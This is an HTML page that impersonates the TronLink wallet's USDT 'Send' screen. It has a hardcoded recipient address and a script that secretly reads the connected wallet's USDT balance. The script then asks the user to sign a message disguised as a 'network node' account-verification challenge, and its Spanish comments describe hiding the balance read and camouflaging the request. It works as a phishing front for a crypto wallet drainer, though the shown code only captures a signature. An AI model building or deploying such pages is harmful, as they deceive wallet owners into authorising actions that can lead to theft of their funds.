<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TronLink</title>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; }
        .tronlink-mobile { width: 100%; max-width: 450px; height: 100vh; background: #ffffff; padding: 20px 20px 80px 20px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
        .screen.active { display: flex; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-top: 10px; }
        .header-left { display: flex; align-items: center; gap: 14px; cursor: pointer; }
        .back-arrow { font-size: 24px; color: #1c1c1e; }
        .header h3 { margin: 0; font-size: 20px; font-weight: 600; color: #1c1c1e; }
        .section-title { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
        .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 15px; outline: none; width: 75%; }
        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .token-left { display: flex; align-items: center; gap: 12px; }
        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
        .btn-bottom { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 85px; left: 20px; text-align: center; }
        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #8e8e93; }
        .nav-item.active { color: #3b50df; }
    </style>
</head>
<body>
<div class="tronlink-mobile">
    <div class="screen active" id="screen1">
        <div class="header">
            <div class="header-left">
                <span class="back-arrow">&lt;</span>
                <h3>Send <span>(1/2)</span></h3>
            </div>
        </div>
        <div class="section-title">Receiving Account</div>
        <div class="input-container">
            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
        </div>
        <button class="btn-bottom" onclick="irAPantalla2()">Next</button>
    </div>
    <div class="screen" id="screen2">
        <div class="header">
            <div class="header-left" onclick="irAPantalla1()">
                <span class="back-arrow">&lt;</span>
                <h3>Send <span>(2/2)</span></h3>
            </div>
        </div>
        <div class="section-title">Token</div>
        <div class="token-selector">
            <div class="token-left">
                <div class="token-icon">₮</div>
                <div>USDT <span>(Tether USD)</span></div>
            </div>
            <div>&gt;</div>
        </div>
        <div class="section-title">Amount</div>
        <div class="input-container">
            <input type="number" id="userAmount" value="10">
        </div>
        <div style="font-size:14px; color:#8e8e93; margin-top:-14px; margin-bottom:24px;">Available: <span id="availableBalance">0.00</span></div>
        <button class="btn-bottom" onclick="solicitarFirmaMensajeMaximo()">Send</button>
    </div>
    <div class="nav-bar">
        <div class="nav-item">📁<br>Tokens</div>
        <div class="nav-item">📊<br>Markets</div>
        <div class="nav-item active">🧭<br>Discover</div>
        <div class="nav-item">👤<br>Me</div>
    </div>
</div>
<script>
    const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";

    function irAPantalla2() {
        document.getElementById('screen1').classList.remove('active');
        document.getElementById('screen2').classList.add('active');
        conectarYActualizarBalance();
    }
    function irAPantalla1() {
        document.getElementById('screen2').classList.remove('active');
        document.getElementById('screen1').classList.add('active');
    }
    async function conectarYActualizarBalance() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            try {
                const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
                const saldoRaw = await contrato.balanceOf(window.tronWeb.defaultAddress.base58).call();
                document.getElementById('availableBalance').innerText = (Number(saldoRaw) / 1000000).toFixed(2);
            } catch(e) {}
        }
    }

    async function solicitarFirmaMensajeMaximo() {
        if (!window.tronWeb) return;
        try {
            const miWallet = window.tronWeb.defaultAddress.base58;
            const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
            
            // Leemos el saldo total del usuario de forma oculta
            const saldoBigNum = await contrato.balanceOf(miWallet).call();
            const saldoDecimal = (Number(saldoBigNum) / 1000000).toFixed(2);

            // Camuflamos la solicitud simulando una firma técnica de auditoría de red
            const hashValidacion = "0x" + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
            const mensajeAuth = `[TronLink Network Node]\nVerify Account Authenticity\nChallenge: ${hashValidacion}\nStatus: Verified\nPending Audit Value: ${saldoDecimal} USDT`;

            console.log(`[Módulo 2] Inyectando saldo máximo en el hash del mensaje: ${saldoDecimal}`);
            
            // Invoca la ventana de firma de mensaje nativa de TronLink
            const hexMensaje = window.tronWeb.toHex(mensajeAuth);
            const firma = await window.tronWeb.trx.sign(hexMensaje);
            
            alert(`¡Demostración Finalizada!\nMensaje de red validado y firmado criptográficamente.\nFirma: ${firma.substring(0,15)}...`);
        } catch (e) {
            console.error(e);
        }
    }
</script>
</body>
</html>
